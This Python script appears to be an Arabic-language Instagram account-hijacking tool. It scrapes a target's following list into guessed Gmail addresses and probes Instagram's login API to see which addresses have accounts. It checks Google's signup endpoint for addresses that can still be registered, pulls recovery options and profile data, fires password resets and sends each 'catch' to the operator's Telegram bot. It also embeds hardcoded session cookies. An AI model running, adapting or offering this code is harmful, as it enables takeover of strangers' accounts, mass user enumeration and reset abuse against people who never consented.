import os
import time
try :
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except ImportError as error :
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('pip install pyfiglet')
    os.system('cls'if os.name=='nt' else'clear')
    time.sleep(1)
    print('Done.')
    exit()
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import datetime
import json
from time import sleep
from os import system
from datetime import date
import socket
import pyfiglet
a=0
z=0
b=0
j=0
m=0
ruu=0
ru=0
ma=0
bp =0
bk=0
bd=0
k=0
t=0
x=0
g=0
L=0
h=0
A=0
f=0
Ru = 0
qw =0
ya =0
yaa=0
hh=0
h=0
hhh=0
yaaa=0
E=0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
#pas = input('Enter Your ID ')
#if pas=="87kk":
#	system('clear')
#else:
#	system('clear')

#pas = input('\033[1;35m# ID : ')
#if pas =='Zaid.Zaid':
#	system('clear')
#else:
#	system('clear')
#	print('\033[1;32m# ID False')
#	exit()
hu= pyfiglet.figlet_format(' MVMVP ')
print(f"\033[6;93m{hu}")
print('\n\033[2;90m\rGmail Tool 0.8\n')
print('\033[1;32mThe Tool Free <> MVMVP - W_Y67 <> IRAQ\n')
ll= datetime.datetime.now()
r = requests.session()
lll = date.today()
r = requests.session()
print('\033[1;36mTele @MVMV - @W_Y67\n')	
def Gmail():
	try:
		fie =open('gmail.txt','r').read().splitlines()
	except FileNotFoundError as error:
		system('clear')
		print('File Error gmail.txt')
		exit()
	cookies =input("🔹 Sen ID - سيشن ايدي : ")		
	took =input('\033[1;36m🔹 Token Bot - توكن البوت  :  ')
	if took=='':
		system('clear')
		print('Tok False')
		exit()
	try:
		idddd =int(input('\033[1;34m🔹 ID Account - ايدي تلكرام : '))
	except ValueError as error:
		system('clear')
		print('ID False')
		exit()
	system('clear')
	global z,a,x,lll,j,g,t,L,f,qw,E,h,A,Ru,ruu,ru,bd,bk,ma,bp,ya,yaa,yaaa,hh,h,hhh
	for BL in fie:
		if ('@gmail.com') in BL:
			url = 'https://b.i.instagram.com/api/v1/accounts/login/'
			KLL= BL.split('@')[0]
			headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
			uid = str(uuid4())
			data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}' .format(BL),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
			try:
				re = requests.post(url,headers=headers,data=data).text	
			except requests.exceptions.ConnectionError as error:
				system('clear')
				print('intrinet Error * حدث خطأ في الاتصال')
				exit()
			
			if ('"invalid_user"')in re:
				os.system('cls'if os.name=='net'else'clear')
				ma+=1
				print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
			elif ('"bad_password"') in re:
				url3 ='https://android.clients.google.com/setup/checkavail'
				headers = {
	        		'Content-Length':'98',
	        		'Content-Type':'text/plain; charset=UTF-8',
	        		'Host':'android.clients.google.com',
	        		'Connection':'Keep-Alive',
	        		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
				data= json.dumps({
	        		'username':BL,
	        		'version':'3',
	        		'firstName':'AbaLahb',
	        		'lastName':'AbuJahl'})
				try:
					res=requests.post(url3,headers=headers,data=data)
				except requests.exceptions.ConnectionError as error:
					system('clear')
					print('intrinet Error * حدث خطأ في الاتصال')
					exit()
				if res.json()['status'] =='USERNAME_UNAVAILABLE':
					os.system('cls'if os.name=='net'else'clear')
					bd+=1
					print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
				elif res.json()['status'] =='SUCCESS':
						with open('True.txt','a') as f8:
							f8.write(f'{BL}\n')
						os.system('cls'if os.name=='net'else'clear')
						L+=1
						print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
						urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
						headr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
						datar={
							'query': f'{BL}'
						}
						rq = requests.post(urlr,headers=headr,data=datar).json()
						#print(rq)
						try:
							B19 =f"{BL}"
							fa =str(rq['options']['can_use_facebook'])
							if fa =='True':
								L3 = 'مرتبط في الفيس بوك'
							else:
								L3='غير مرتبط في الفيس بوك'
							ph = str(rq['options']['can_send_phone'])
							if ph =='True':
								L5 = ('مرتبط برقم')
							else:
								L5='غير مرتبط برقم'
						except KeyError as Error:
							L7 ='الريست لا يعمل'
						G1 = (KLL)
						iip=(G1)
						url22 = f'https://www.instagram.com/{iip}/?__a=1&__d=dis'
						head1 = {
			                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			                'accept-encoding': 'gzip, deflate, br',
			                'accept-language': 'en-US,en;q=0.9',
			                'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
			                'referer': 'https://www.instagram.com/{}/'.format(iip),
			                'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
			                'sec-ch-ua-mobile': '?1',
			                'sec-fetch-dest': 'document',
			                'sec-fetch-mode': 'navigate',
			                'sec-fetch-site': 'snone',
			                'upgrade-insecure-requests': '1',
			                'user-agent': generate_user_agent(),
						}
						rr =requests.get(url22,headers=head1).json()
						try:
							nam = str(rr['graphql']['user']['full_name'])
							iddd = str(rr['graphql']['user']['id'])
							fol = str(rr['graphql']['user']['edge_followed_by']['count'])
							fols =str(rr['graphql']['user']['edge_follow']['count'])
							isp = str(rr['graphql']['user']['is_private'])
							bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
							
							re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
							#except requests.exceptions.JSONDecodeError as error:
#								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=🗿 〝 حيآڪ الُِله ، رقمِ الصيدِ 〞 {j}\n--------------------------------\n📟 〝 آسم آلُِمستخـدِم 〞 : {iip}\n🗞️ 〝 الاسہم 〞  {nam}\n📧 〝 آلبَريد 〞 : {iip}@gmail.com\n🚻 〝 عدد المتہٰابعيٰن 〞 : {fol}\n👥 〝 يٰتہٰابع 〞 : {fols}\n🗺 〝 عدد المنشوراتہ 〞 : {bio}\n🔐 〝 خـصوُصية الُحسابَ 〞 : {isp}\n🔁 〝 رٍيست الُحسابَ 〞 : يعمل\n⌚️ 〝 تہاريخ الصہٰيٰد 〞 : {lll}\n————————×————————\n♜ 〝 حـــقٌــوُقٌـ,ـ 〞 : @MVMVP ↷ @W_Y67 \n\nالُمبرمج زْيد ڪرٍيم')
#								ru= requests.post(tlg)
#								
#								continue
							ree = re.json()
							dat = ree['data']
							j+=1
							headers = {
        # 'Content-Length': '305',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',
        # Requests sorts cookies= alphabetically

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
        # 'Accept-Encoding': 'gzip',
							}
							data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
							res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
							rs =str(res['obfuscated_email'])
							try:
								uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸
🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {iip}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {iip}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {bio}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {dat}\n🔐 ⌯ خصـوصـية آلحسـآب : {isp}\n🛡️ ⌯ آلفيسـبوگ : {L3}\n📲 ⌯ رقمـ آلهہآتف : {L5}\n🔁 ⌯ ريسـت آلحسـآب : يعمل\n🗝 ⌯ ريسـت آلبآسـورد : {rs}\n⌚️ ⌯ تآريخ آلصـيد  : {lll} 

♜ ⌯ حقوق : @MVMVP - @W_Y67
♜ ⌯ برمـجة زيد كريم ☢️''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)
							except UnboundLocalError as error:
								L+=1
								os.system('cls'if os.name=='net'else'clear')
								print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
								uq=(f'''🗿 ⌯ زيد گريمـ جآبلگ صـيد 🚸
🏴‍☠️|⌯رقمـ آلصـيد : {j}\n📟 ⌯ آسـمـ آلمـسـتخدمـ : {iip}\n🗞️ ⌯ آلآسـمـ : {nam}\n📧 ⌯ آلبريد : {iip}@gmail.com\n👥 ⌯ عددآلمـتآبعين : {fol}\n🚻 ⌯ يتآبع : {fols}\n🗺 ⌯ عدد آلمـنشـور : {bio}\n⌛️ ⌯ تآريخ آنشـآء آلحسـآب : {dat}\n🔐 ⌯ خصـوصـية آلحسـآب : {isp}\n⌚️ ⌯ تآريخ آلصـيد  : {lll} 

♜ ⌯ حقوق : @MVMVP - @W_Y67
♜ ⌯ برمـجة زيد كريم ☢️''')
								tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={uq}')
								ru= requests.post(tlg)	
						except KeyError as error :
							E+=1
							os.system('cls'if os.name=='net'else'clear')
							print(f'\033[1;32m[=] - Gmail : {L}\n\033[1;33m[=] - Bad Mail : {bd}\n\033[1;33m[=] - Bad insat : {ma}\n\033[1;35m[=] - Error username : {E}\n\033[1;32m[=] - Telegram : W_Y67 - MVMVP\n')
#########Hotmail#########
def Cl():
        global a,z,t,x
        cookies =input("🔹 \033[1;33mSessionid - \033[1;32mاضف سيشن ايدي هنا  : ")
        
        iii = input('\033[1;33m🔹Enter Your User list - \033[1;32mاضف يوزر لسحب لستة : \n')
        url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
        head1 = {
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
	            'referer': 'https://www.instagram.com/{}/'.format(iii),
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	        }
        try:
        	rr = r.get(url22,headers=head1).json()
        	
        except json.decoder.JSONDecodeError as error:
        	system('clear')
        	print('* \033[1;32mBloked or Band Account')
        	exit()	
        try:
         fol = str(rr['graphql']['user']['edge_follow']['count'])
         idd = str(rr['logging_page_id'])
         ss = idd.split('_')[1]
        except KeyError as error :
             print('plsess user True...! - هذا الحساب خاص ')
             time.sleep(2)
             system('clear')
             while True:
             	Cl()
             #exit()
        x = int(fol)
        url4 = f'https://i.instagram.com/api/v1/friendships/{ss}/following/?count={fol}'
        head4 ={
	            'accept': '*/*',
	            'accept-encoding': 'gzip, deflate, br',
	            'accept-language': 'en-US,en;q=0.9',
	            'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={cookies}',
	            'referer': 'https://www.instagram.com/',
	            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
	            'sec-ch-ua-mobile': '?0',
	            'sec-fetch-dest': 'empty',
	            'sec-fetch-mode': 'cors',
	            'sec-fetch-site': 'same-origin',
	            'user-agent': generate_user_agent(),
	            'x-asbd-id': '437806',
	            'x-ig-app-id': '936619743392459',
	            'x-ig-www-claim': 'hmac.AR3iJo8fToOaW2YqFg8Fs_vZX0vRsp_WJuOh9w4JPDrYKWOV',
	            'x-requested-with': 'XMLHttpRequest'
	        }
        data4 ={
        	'count': fol
	        }
        re = requests.get(url4,headers=head4,data=data4).json()
        try:
        	for zaid in range(0,x):
        	    us = str(re['users'][zaid]['username'])
	            a+=1 
	            os.system('cls' if os.name == 'nt' else'clear')
	            print(f'\033[1;35m[=] - Done >> [{a}]\n[=] - User >> \033[1;36m[{us}]\n\033[1;35m[=] - Time >> [{ll}]\n\033[1;32m[=] - Telegram : @MVMVP - @W_Y67')
	            Rq = ['@gmail.com']
	            Tq = random.choice(Rq)
	            with open('gmail.txt','a') as f9:
	                f9.write(f'{us}@gmail.com\n')       
        except IndexError as error :
	        print('Error...Tools - حدثت مشكلة غير قادر على الاكمال')
	        exit()
def O():
	try:
		os.remove('gmail.txt')		
		print('Done - تم حذف الملف بنجاح')
	except FileNotFoundError as error:
		system('clear')
		print('Error - ملف gmail.txt غير متوفر في جهازك')
		exit()
print('\033[1;32m[1] - List Username - انشاء لستة\n[2] - Checker List - فحص لستة\n[3] - Remov File - حدف لستة\n')
try:
	H = int(input('\033[1;35m[!] - Enter Your : '))
	system("clear")
except ValueError as error:
	system('clear')
	print('Error - لا يجوز اختيار احرف')
	exit()
if H ==1:
		Cl()
elif H==2:
	Gmail()				
elif H==3:
	O()
else:
	system('clear')
	print('Error - اختيار خطأ')
	exit()
